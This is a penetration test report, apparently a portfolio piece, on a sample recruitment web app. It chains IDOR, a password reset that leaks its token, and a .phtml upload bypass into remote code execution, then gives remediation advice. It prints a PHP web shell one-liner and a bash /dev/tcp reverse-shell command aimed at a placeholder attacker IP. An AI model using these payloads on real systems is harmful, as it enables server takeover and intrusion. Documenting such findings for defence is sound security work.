# Penetration-test-report

# Penetration Test Report. RecruitX Web Application

**Target:** RecruitX Recruitment Portal  
**Scope:** External Black-Box Web Application Assessment  
**Date:** November 2026  
**Classification:** Confidential (Sanitized for Portfolio)

> **Disclaimer:** The testing was done in a lab setting that was isolated from everything else. RecruitX is just a sample application created for learning purposes. No live system, user information, or network was used in the process.

---

## 1. Executive Summary

A black-box penetration test of RecruitX web application was carried out in an external manner without any insider information and credentials.

The aim of this activity is to discover vulnerabilities, assess its business consequences and demonstrate how an attacker can penetrate into the web application and the underlying server.
Remote code execution (RCE) on the target server was performed. It did not happen due to a single major vulnerability but was a result of a chain of exploiting of four different vulnerabilities:
1.  **Insecure Direct Object Reference (IDOR):** Allowed enumeration of all user records and identification of the administrator account.
2.  **Broken Password Reset Mechanism:** Disclosed reset tokens in the HTTP response, leading to a full account takeover.
3.  **Insecure File Upload:** Bypassed client-side and server-side filters to upload a malicious server-side script.
4.  **Web Shell Execution:** Leveraged the uploaded script to execute arbitrary system commands and establish a reverse shell as the `www-data` user.

---

## 2. Methodology and Techniques Utilized

A typical pen testing methodology was employed during our tests: Reconnaissance → Enumeration → Exploitation → Post-Exploitation.

- Reconnaissance and enumeration: nmap, gobuster.
- Web application assessment: Browser developer tools, curl.
- Exploitation: Payload crafting manually, netcat.

### Phase 1: Reconnaissance and enumeration

**1.1 Port Scanning**
```bash
nmap -sV -sC -p- <TARGET_IP>
```

Results:

Port 22: OpenSSH
Port 80: Apache httpd (PHP)
Port 3306: MySQL (Exposed to the Internet – Finding: Database must not be publicly accessible)
Port 8080: Alternative HTTP (Apache)

Directory Enumeration: 
``` 
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```
Endpoints : /admin/, /api/, /reset.php, /uploads/



---

### Phase 2: IDOR. User Enumeration

- **Type of Vulnerability:** `CWE-639: Authorization Bypass`
- **Severity:** Medium

The `/api/user` API is not properly secured with authorization controls and has IDOR issues.

```bash
curl -s "http://<TARGET_IP>/api/user?id=1"
```
The API gives JSON output for id=1, which is the Administrator's ID. Traversing IDs from lower to higher values will give the full list of users in the system, including email addresses and roles.
Outcome: Found the Administrator’s account and high-value targets.

---

### Phase 3: Account Hijack through Exploitable Password Reset Functionality

- **Weakness:** `CWE-640: Weak Password Recovery` and `CWE-200: Information Disclosure`
- **Priority:** High

The `/reset.php` URL sends back the 6 digit reset code directly through the HTTP reply rather than by email.

**Process for Exploitation:**
1. Send the email of the administrator to `/reset.php`.
2. Get the code from the HTTP reply.
3. Set a new password with this code.

> **Result:** Full takeover of the top-level application user account.

---

### Phase 4: Bypassing File Upload Filters to Achieve RCE

**Vulnerability:** `CWE-434. Unrestricted upload of file with dangerous type`
**Level of Severity:** High

`/admin/upload.php` contains 2 bypassable filters: client-side "accept" filter which can be bypassed using Dev Tools/Burp, and server-side blacklist that rejects files with ".php" extension, but allows .phtml

### Steps for Exploit:

Create webshell called `shell.phtml`: 
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Upload the file using the admin panel.
Run the commands in the system through the uploaded file:
```
curl "http://<TARGET_IP>/uploads/documents/shell.phtml?cmd=id"
```
Result: Arbitrary execution of commands in the backend server.

---

### Phase 5: Upgrading Web Shell Access to Interactive Reverse Shell

- **Vulnerability:** `CWE-94: Improper Control of Generation of Code` (Post-exploitation)
- **Severity:** Critical

With the command execution through the web shell, we managed to elevate our access to an interactive reverse shell. This will serve as a solid foundation for future exploitation.

**Exploitation Process:**
1. Setup a Netcat listener on the attacker's machine:
   ```bash
   nc -lvnp 4444
2. Initiate the reverse shell payload by using the web shell link:
   ```
   curl "http://<TARGET_IP>/uploads/documents/shell.phtml?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<ATTACKER_IP>/4444%200>%261'"

Result: Interactive reverse shell was achieved with user www-data on the host recruitx-prod, resulting in complete compromise of the host.

Impact: Total control of the web server that enables an attacker to read any file, pivot into the internal network, or run ransomware.

---

### Key findings:

Client-side controls do not contribute to security at all. The accept attribute was easily bypassed within seconds. Server-side validation is absolutely required.

Blocklisting never works. The decision to block .php but allow .phtml is an example of bad architecture. Always use allowlisting.

Chaining vulnerabilities is important. None of the bugs were individually critical. But together, they led to total server compromise. This is how real-world attacks happen.

Opaque IDs are inherently resistant to IDOR. The use of UUIDs instead of sequential IDs makes enumeration impossible even if authorization is skipped.

---

## Recommendations & Fixes

- **IDOR**: Apply Role-based Access Control for all the requests. Remove sequential numbering scheme for IDs; use UUIDs to ensure non-enumerability.
- **Password Reset**: Do not send any reset tokens back in HTTP response. Use strong cryptographic tokens (more than 32 chars); short TTL (15 mins), and implement rate limiting.
- **File Upload**: Adopt strict allowlist on server side for allowed file types and MIME types. File naming should be performed, and files should be stored outside the web root (or in cloud storage with no exec access).
- **RCE/Reverse Shell**: Remove vulnerable PHP functions (`shell_exec`, `exec`, `system`) from `php.ini` configuration file. Adopt egress firewall rules for outbound communication prevention.

